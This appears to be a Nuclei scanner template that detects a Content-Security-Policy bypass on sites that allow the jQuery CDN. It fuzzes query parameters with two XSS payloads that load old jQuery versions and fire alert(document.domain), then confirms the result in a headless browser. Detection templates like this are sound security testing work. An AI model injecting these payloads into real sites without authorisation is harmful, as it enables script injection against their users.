flow: http(1) && headless(1)
headless:
- fuzzing:
  - fuzz:
    - '{{url_encode(injection)}}'
    mode: single
    part: query
    type: replace
  matchers:
  - dsl:
    - jquery_csp_xss == true
    type: dsl
  payloads:
    injection:
    - <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script><script>$.get("data:text/javascript,alert(document.domain)")</script>
    - <script src="https://code.jquery.com/jquery-1.12.4.min.js"></script><div id="x"></div><script>$("#x").html("<img
      src=x onerror=alert(document.domain)>")</script>
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitdialog
    args:
      max-duration: 5s
    name: jquery_csp_xss
http:
- matchers:
  - condition: and
    internal: true
    part: header
    type: word
    words:
    - Content-Security-Policy
    - code.jquery.com
  method: GET
  path:
  - '{{BaseURL}}'
id: jquery-cdn-csp-bypass
info:
  author: 0x_Akoko
  classification:
    cwe-id: CWE-79
  description: 'CSP policy allows jQuery CDN which enables arbitrary JavaScript execution
    through vulnerable jQuery versions using parseHTML or $.get functions.

    '
  metadata:
    max-request: 2
    verified: true
  name: Content-Security-Policy Bypass - jQuery CDN
  reference:
  - https://www.doyler.net/security-not-included/csp-bypass-via-jquery
  - https://github.com/jquery/jquery/issues/2432
  - https://bugs.jquery.com/ticket/11974
  severity: medium
  tags: xss,csp-bypass,jquery,vuln
